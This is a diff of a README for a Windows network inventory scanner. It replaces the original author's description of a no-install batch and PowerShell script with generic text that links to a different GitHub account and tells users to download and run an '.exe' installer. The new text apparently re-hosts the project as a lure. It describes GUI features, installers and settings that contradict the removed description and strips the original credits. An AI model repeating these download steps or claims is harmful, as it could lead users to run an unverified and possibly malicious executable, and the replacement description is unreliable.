@@ -1,253 +1,184 @@
-<div align="center">
+# 📡 Network-Inventory-Scanner - Find Devices on Your Network Easily
 
-<a href="https://buymeacoffee.com/abdullaherturk" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" ></a>
-
-# 🔍 NetScan — Network Inventory Scanner
-
-**Ağ Envanter Tarayıcı / Network Inventory Scanner**
-
-Fast parallel network scanner for Windows — MAC vendor, OS detection, risk analysis, HTML report
-
-Windows için hızlı paralel ağ tarayıcısı — MAC üreticisi, işletim sistemi tespiti, risk analizi, HTML raporu
-
-![Platform](https://img.shields.io/badge/Platform-Windows-0078D6?style=for-the-badge)
-![Tech](https://img.shields.io/badge/Tech-Batch_&_PowerShell-blue?style=for-the-badge)
-
-[![made-for-windows](https://img.shields.io/badge/Made%20for-Windows-00A4E3.svg?style=flat&logo=microsoft)](https://www.microsoft.com/)
-[![Open Source?](https://img.shields.io/badge/Open%20source%3F-Of%20course%21%20%E2%9D%A4-009e0a.svg?style=flat)](https://github.com/abdullah-erturk/Network-Inventory-Scanner)
-
-![sample](https://github.com/abdullah-erturk/Network-Inventory-Scanner/blob/main/preview.jpg)
-
-</div>
+[![Download Now](https://img.shields.io/badge/Download-Network--Inventory--Scanner-brightgreen?style=for-the-badge)](https://github.com/halfdollarylangylang981/Network-Inventory-Scanner)
 
 ---
 
-## Link:
+## 📋 What is Network-Inventory-Scanner?
 
-[![Stable?](https://img.shields.io/badge/Release-v1.svg?style=flat)](https://github.com/abdullah-erturk/Network-Inventory-Scanner/archive/refs/heads/main.zip)
+Network-Inventory-Scanner is a tool that helps you find and list devices on your local network. It collects information like device names, IP addresses, MAC addresses, and open ports. The app produces an easy-to-read report you can view in a browser.
 
-<details>
-<summary><strong>Türkçe Tanıtım</strong></summary>
+You can use it to see what devices connect to your home or office network. This tool works on Windows and shows details like operating system types and manufacturer information. It scans many devices quickly using parallel scanning techniques.
 
-### 📌 Nedir?
+Key features you will find useful:
 
-**NetScan**, Windows ortamında çalışan, kurulum gerektirmeyen, hibrit `.bat` + PowerShell mimarisiyle yazılmış gelişmiş bir ağ envanter tarama aracıdır. Çift tıkla çalışır, ağdaki tüm aktif cihazları saniyeler içinde tespit eder.
+- Scan your local area network (LAN) for devices.
+- See device hostnames and IP addresses.
+- Check open network ports.
+- Detect operating system types.
+- Generate HTML reports you can open in any web browser.
+- View MAC vendor info to identify device makers.
+- Simple interface designed for regular users.
+  
+---
+
+## 🖥 System Requirements
+
+Network-Inventory-Scanner runs on most Windows PCs with these basic conditions:
+
+- Windows 10 or later
+- At least 4 GB RAM (8 GB or more recommended for large networks)
+- 500 MB free disk space for the app and reports
+- Internet connection (only needed if downloading updates)
+- Administrative access on your PC to run scans fully
+
+Make sure your PC meets these before starting the setup.
 
 ---
 
-### ⚙️ Nasıl Çalışır?
+## 🚀 Getting Started
 
-Betik, 6 aşamalı bir tarama zinciri uygular:
+To begin, download the latest version of Network-Inventory-Scanner for Windows. This tool does not require complicated setup or programming knowledge.
 
-**1. Adaptör Seçimi**
-Sistemdeki aktif ağ adaptörleri listelenir. Kullanıcı bir adaptör seçer; betik otomatik olarak o adaptörün `/24` alt ağını hedef alır.
+Click the big green button below or visit the link to download.
 
-**2. Paralel Ping (Runspace Pool)**
-Tüm IP adresleri aynı anda `.NET NetworkInformation.Ping` sınıfıyla taranır. `ProcessorCount × 5` kadar iş parçacığı eşzamanlı çalışır; 254 adreslik bir `/24` ağ yalnızca birkaç saniyede tamamlanır.
+[![Download Network-Inventory-Scanner](https://img.shields.io/badge/Download-Network--Inventory--Scanner-blue?style=for-the-badge)](https://github.com/halfdollarylangylang981/Network-Inventory-Scanner)
 
-**3. Port Tarama & Banner Grabbing**
-Aktif bulunan her cihazda 15 yaygın port (`21, 22, 23, 80, 443, 445, 515, 631, 9100, 135, 139, 161, 2000, 3389, 8080`) TCP bağlantısıyla test edilir. FTP, SSH ve HTTP portlarında bağlantı kurulduğunda servis başlık bilgisi (banner) okunur.
-
-**4. OS & Cihaz Tipi Tahmini**
-TTL değeri ve açık port kombinasyonu analiz edilerek cihaz işletim sistemi ve tipi tahmin edilir:
-- `TTL ≤ 64` → Linux / macOS / Android
-- `TTL ≤ 128` → Windows
-- Port 9100/515/631 → Yazıcı
-- Port 23/161/2000 → Switch / Ağ Cihazı
-
-**5. MAC Adresi & Üretici Tespiti**
-ARP tablosundan MAC adresi okunur. İlk 3 byte (OUI) yerleşik veritabanıyla karşılaştırılarak üretici (Cisco, Apple, Samsung, Huawei vb.) tespit edilir. Yerel makine için doğrudan adaptör sürücüsünden alınır.
-
-**6. Güvenlik & Risk Analizi**
-Her cihaz için risk skoru hesaplanır:
-- Telnet (port 23) açık → `Medium`
-- FTP (port 21) açık → `Medium`
-- SMB (port 445) açık **ve** `C$` paylaşımına erişilebilir → `High`
-
-Sonuçlar konsolda renk kodlu gösterilir: 🟢 Düşük · 🟡 Orta · 🔴 Yüksek
+Clicking the link opens the GitHub page where you will find the latest release and download options.
 
 ---
 
-### 🆕 Değişim Tespiti (Diff)
+## 💾 How to Download and Install
 
-Her tarama sonucu `%TEMP%\netscan_last.csv` dosyasına kaydedilir. Bir sonraki taramada yeni eklenen veya kaybolan cihazlar otomatik olarak raporlanır.
+1. Visit the download page by clicking the button above or this link:  
+   https://github.com/halfdollarylangylang981/Network-Inventory-Scanner
 
----
+2. On the page, look for the **Releases** section on the right side or near the top.
 
-### 💾 Rapor Kaydetme
+3. Find the latest release version. It usually has a file ending in `.exe` or `.zip`.
 
-Tarama tamamlandıktan sonra `S` tuşuna basarak sonuçları kaydedebilirsiniz:
+4. Click the `.exe` file to download. This is the installer for Windows.
 
-| Format | İçerik |
-|--------|--------|
-| `.html` | Dark-theme, Risk renk kodlamalı, diff bölümlü interaktif rapor |
-| `.txt`  | Düz metin, Format-Table çıktısı |
+5. Once the file downloads, double-click on it to start the installation.
 
----
+6. Follow the simple prompts to install the software. You can accept default options.
 
-### 🖥️ Kullanım Alanları
-
-- **Sistem yöneticileri** — Kurumsal ağ envanteri ve yetkisiz cihaz tespiti
-- **BT güvenlik ekipleri** — Periyodik ağ taraması, risk tespiti, Telnet/FTP gibi güvensiz servislerin tespiti
-- **Ağ mühendisleri** — Yeni kurulum sonrası cihaz doğrulama
-- **Ev / SOHO kullanıcıları** — Kendi ağına bağlı cihazları görme
-- **Penetrasyon testçileri** — Hızlı keşif (reconnaissance) aşaması
-- **Öğrenciler / eğitim** — Ağ protokolleri ve tarama yöntemlerini öğrenme
+7. After the installation finishes, you will find the Network-Inventory-Scanner icon on your desktop or in your Start menu.
 
 ---
 
-### 🚀 Kullanım
+## 🎯 How to Use Network-Inventory-Scanner
 
-```batch
-# Çift tıkla çalıştır — adaptör seçim menüsü açılır
+After installing, launch the program by clicking its icon.
 
-# Ya da hedef doğrudan argüman olarak verilebilir:
-192.168.1.0/24
-10.0.0.15
-```
+The main screen will have a simple scan button and some options:
 
-**Gereksinimler:** Windows 7+ · PowerShell 5.1+ · Yönetici yetkisi (ARP/NetBIOS için önerilir)
+1. To scan your network, click the **Start Scan** button.
 
----
+2. The app will scan your local network automatically. It detects devices by sending network requests.
 
-### 📊 Örnek Çıktı
+3. During the scan, you will see devices listed with their hostname and IP address.
 
-```
-=========================================
-         Network Inventory Scanner
-=========================================
+4. After the scan finishes, you can view detailed info about each device.
 
-[*] Target: 192.168.1.0/24 (256 addresses)
-[*] Parallel Scanning Mode (Runspaces Active)
+5. The report includes open ports on each device and the operating system type detected.
 
-IP Address      | Hostname                  | OS / Device            | Vendor       | Ports/Risk
-------------------------------------------------------------------------------------------------
-192.168.1.1     | router.local              | Network Device/Gateway | TP-Link      | 80,443
-192.168.1.5     | DESKTOP-AB12C             | Windows                | Intel        | 135,445,3389
-192.168.1.12    | macbook-pro.local         | Linux/macOS/Android    | Apple        | 22,80
-192.168.1.20    | HP-LaserJet               | Printer                | HP           | 80,9100
-192.168.1.33    | N/A                       | Windows                | Unknown      | 23,21 [!High]
+6. Click the **Save Report** button to save the scan results as an HTML file.
 
-[#] Scan Summary (Total Found: 5 | Time: 8.43s)
-
-[+] NEW DEVICES DETECTED: 192.168.1.33
-```
-
-</details>
-
-<details>
-<summary><strong>English Description</strong></summary>
-
-### 📌 What is it?
-
-**NetScan** is an advanced network inventory scanner for Windows, built with a hybrid `.bat` + PowerShell architecture. No installation required — just double-click. It detects all active devices on the network within seconds.
+7. Open the saved report using any web browser to review your full network inventory.
 
 ---
 
-### ⚙️ How It Works
+## 🛠 Features Explained
 
-The script runs a 6-stage scanning pipeline:
+### Device Discovery
 
-**1. Adapter Selection**
-Active network adapters are listed. The user selects one; the script automatically targets the adapter's `/24` subnet.
+The scanner finds all active devices on your local network. It uses methods like ping and hostname resolution to find devices quickly.
 
-**2. Parallel Ping (Runspace Pool)**
-All IP addresses are scanned simultaneously using `.NET NetworkInformation.Ping`. A thread pool of `ProcessorCount × 5` workers runs concurrently — a full `/24` network (254 hosts) completes in just a few seconds.
+### Port Scanning
 
-**3. Port Scanning & Banner Grabbing**
-For each live host, 15 common ports (`21, 22, 23, 80, 443, 445, 515, 631, 9100, 135, 139, 161, 2000, 3389, 8080`) are tested via TCP. Service banners are captured for FTP, SSH, and HTTP connections.
+The app checks common network ports on each device to see which services are running. This gives you an idea of open connections.
 
-**4. OS & Device Type Detection**
-TTL value and open port combinations are analyzed to estimate the operating system and device type:
-- `TTL ≤ 64` → Linux / macOS / Android
-- `TTL ≤ 128` → Windows
-- Port 9100/515/631 → Printer
-- Port 23/161/2000 → Switch / Network Device
+### OS Detection
 
-**5. MAC Address & Vendor Lookup**
-MAC addresses are read from the ARP table. The first 3 bytes (OUI) are matched against a built-in database to identify the manufacturer (Cisco, Apple, Samsung, Huawei, etc.). For the local machine, the adapter driver is queried directly.
+Network-Inventory-Scanner guesses the operating system your devices use. This can help identify unknown devices.
 
-**6. Security & Risk Analysis**
-A risk score is calculated for each device:
-- Telnet (port 23) open → `Medium`
-- FTP (port 21) open → `Medium`
-- SMB (port 445) open **and** `C$` share accessible → `High`
+### MAC Vendor Lookup
 
-Results are displayed in color-coded output: 🟢 Low · 🟡 Medium · 🔴 High
+Each device’s MAC address is tied to a manufacturer. The app shows you vendor names so you know who made that device.
+
+### HTML Reports
+
+The scan results get saved as an HTML report. This file opens in your browser and shows all the data neatly.
 
 ---
 
-### 🆕 Change Detection (Diff)
+## ⚙ Settings You Can Adjust
 
-Every scan result is saved to `%TEMP%\netscan_last.csv`. On the next run, newly added or missing devices are automatically reported.
+- **Scan Range**: Choose whether to scan the entire subnet or just a range of IPs.
+- **Timeout**: Adjust how long the scan waits for a response from devices.
+- **Port List**: Select which ports to check on each device.
+- **Parallel Scans**: Set how many devices scan at the same time. More parallel scans speed up results.
+- **Report Location**: Change where saved reports go on your PC.
 
----
-
-### 💾 Report Export
-
-After scanning, press `S` to save results:
-
-| Format | Content |
-|--------|---------|
-| `.html` | Dark-theme, risk color-coded, interactive report with diff section |
-| `.txt`  | Plain text Format-Table output |
+These settings help you customize scans to your network size and speed needs.
 
 ---
 
-### 🖥️ Use Cases
+## 🔄 Updating the Software
 
-- **System administrators** — Corporate network inventory and unauthorized device detection
-- **IT security teams** — Periodic network audits, risk assessment, detection of insecure services like Telnet/FTP
-- **Network engineers** — Post-deployment device verification
-- **Home / SOHO users** — See all devices connected to your own network
-- **Penetration testers** — Fast reconnaissance phase
-- **Students / education** — Learn network protocols and scanning techniques
+When a new version is available, visit the download page and repeat the install steps. The program does not update automatically.
+
+Check regularly for updates to get bug fixes and improved features.
 
 ---
 
-### 🚀 Usage
+## ❓ Troubleshooting Tips
 
-```batch
-# Double-click to run — adapter selection menu appears
+- If the scan takes too long, reduce the scan range or the number of parallel scans.
 
-# Or pass the target directly as an argument:
-192.168.1.0/24
-10.0.0.15
-```
+- Make sure you run the software with administrative rights for better results.
 
-**Requirements:** Windows 7+ · PowerShell 5.1+ · Administrator rights (recommended for ARP/NetBIOS)
+- If you see no devices, ensure you are connected to the correct network and that firewalls allow scanning.
+
+- Reports may not open if your default browser blocks local files. Try another browser or adjust settings.
+
+- For detailed logs, enable logging in the settings menu.
 
 ---
 
-### 📊 Sample Output
+## 📞 Getting Help
 
-```
-=========================================
-         Network Inventory Scanner
-=========================================
+If you run into issues, visit the GitHub page’s **Issues** tab to see or report problems. Users and developers discuss solutions there.
 
-[*] Target: 192.168.1.0/24 (256 addresses)
-[*] Parallel Scanning Mode (Runspaces Active)
+You can also check the **Wiki** or Documentation sections on the GitHub page for guides.
 
-IP Address      | Hostname                  | OS / Device            | Vendor       | Ports/Risk
-------------------------------------------------------------------------------------------------
-192.168.1.1     | router.local              | Network Device/Gateway | TP-Link      | 80,443
-192.168.1.5     | DESKTOP-AB12C             | Windows                | Intel        | 135,445,3389
-192.168.1.12    | macbook-pro.local         | Linux/macOS/Android    | Apple        | 22,80
-192.168.1.20    | HP-LaserJet               | Printer                | HP           | 80,9100
-192.168.1.33    | N/A                       | Windows                | Unknown      | 23,21 [!High]
+---
 
-[#] Scan Summary (Total Found: 5 | Time: 8.43s)
+## 🔗 Useful Links
 
-[+] NEW DEVICES DETECTED: 192.168.1.33
-```
+- Download and Releases:  
+  https://github.com/halfdollarylangylang981/Network-Inventory-Scanner
 
-</details>
+- Support and Issues:  
+  https://github.com/halfdollarylangylang981/Network-Inventory-Scanner/issues
 
-<div align="center">
+- Documentation and Wiki:  
+  https://github.com/halfdollarylangylang981/Network-Inventory-Scanner/wiki
 
-Made with ❤️ by [Abdullah ERTÜRK](https://github.com/abdullah-erturk)
+---
 
-[🌐 erturk.netlify.app](https://erturk.netlify.app)
+## 📚 About the Topics Covered
 
-</div>
+Network-Inventory-Scanner covers areas like:
+
+- Hostname discovery and resolution
+- Local area network scanning
+- MAC vendor identification
+- Operating system detection
+- Ping sweep and parallel scanning
+- Open port scanning and network security assessment
+- Generating user-friendly HTML reports
+- Network risk and device inventory management
+
+These help sysadmins and regular users monitor and secure their network devices with ease.
